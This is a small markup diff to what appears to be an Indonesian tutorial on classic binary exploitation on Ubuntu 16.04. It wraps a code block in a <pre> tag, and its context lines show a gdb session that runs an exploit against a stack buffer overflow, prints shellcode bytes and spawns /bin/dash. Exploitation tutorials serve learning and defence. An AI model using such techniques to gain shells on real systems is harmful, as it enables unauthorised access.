@@ -6,7 +6,7 @@ Klasik binary exploitation di Ubuntu 16.04
 ---
 
 <h4>Stack Buffer Overflow</h4>
-<code>
+<code><pre>
   % gdb -q bof
 Reading symbols from bof...(no debugging symbols found)...done.
 (gdb) r `./exploit 0xffffffff`
@@ -156,4 +156,4 @@ kamu mengatakan : ���������������������
                                                                                          X̀jX1�̀����������������������������
 process 12451 is executing new program: /bin/dash
 $ 
-  </code>
+  </code></pre>
